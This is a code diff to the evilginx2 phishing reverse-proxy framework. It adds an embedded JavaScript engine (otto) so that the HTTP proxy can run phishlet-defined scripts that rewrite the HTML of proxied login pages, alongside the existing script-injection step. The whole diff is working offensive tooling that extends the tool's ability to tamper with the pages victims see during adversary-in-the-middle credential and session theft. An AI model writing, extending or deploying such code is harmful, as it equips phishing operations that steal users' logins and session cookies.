@@ -35,6 +35,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 	"github.com/mwitkow/go-http-dialer"
+	"github.com/robertkrimen/otto"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -780,7 +781,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				/*
+				if stringExists(mime, []string{"text/html", "text/css", "application/x-javascript", "application/json", "text/plain"}){
 
+				}*/
 				if stringExists(mime, []string{"text/html"}) {
 
 					if pl != nil && ps.SessionId != "" {
@@ -792,6 +796,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								body = p.injectOgHeaders(l, body)
 							}
 
+							script, err := pl.GetHtmlReplace(req_hostname, resp.Request.URL.Path)
+							if err == nil {
+								log.Debug("html_replace: matched %s%s - replacing html", req_hostname, resp.Request.URL.Path)
+								vm := otto.New()
+								err := vm.Set("htmlContent", string(body))
+								if err != nil {
+									log.Error(err.Error())
+								}
+								result, err := vm.Run(script)
+								if err != nil {
+									log.Error(err.Error())
+								}
+								strResult, _ := result.ToString()
+								body = []byte(strResult)
+							}else{
+								log.Error(err.Error())
+							}
+
+
 							var js_params *map[string]string = nil
 							if s, ok := p.sessions[ps.SessionId]; ok {
 								/*
@@ -800,7 +823,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}*/
 								js_params = &s.Params
 							}
-							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+
+							script, err = pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
 								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
 								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
